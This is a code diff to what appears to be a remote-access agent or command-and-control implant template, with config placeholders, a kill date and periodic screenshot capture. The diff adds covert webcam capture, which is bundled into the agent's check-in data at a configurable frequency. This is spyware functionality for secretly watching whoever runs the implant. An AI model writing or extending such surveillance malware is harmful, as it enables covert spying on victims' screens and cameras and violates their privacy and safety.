@@ -160,6 +160,8 @@ class Config:
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = {take_screenshots}
         self.SCREENSHOT_FREQUENCY = {screenshot_frequency}
+        self.TAKE_WEBCAM = {take_webcam}
+        self.WEBCAM_FREQUENCY = {webcam_frequency}
         self.KILLDATE_ENABLED = {killdate_enabled}
         self.KILLDATE = "{killdate}" if {killdate_enabled} else ""
 
@@ -2678,6 +2680,13 @@ class Agent:
                 screenshot = SystemUtils.take_screenshot()
                 if screenshot:
                     data["screenshot"] = screenshot
+
+        if self.config.TAKE_WEBCAM:
+            
+            if self._checkin_count % self.config.WEBCAM_FREQUENCY == 0:
+                webcam = SystemUtils.capture_webcam()
+                if webcam:
+                    data["webcam"] = webcam
 
         self._checkin_count += 1
         return data
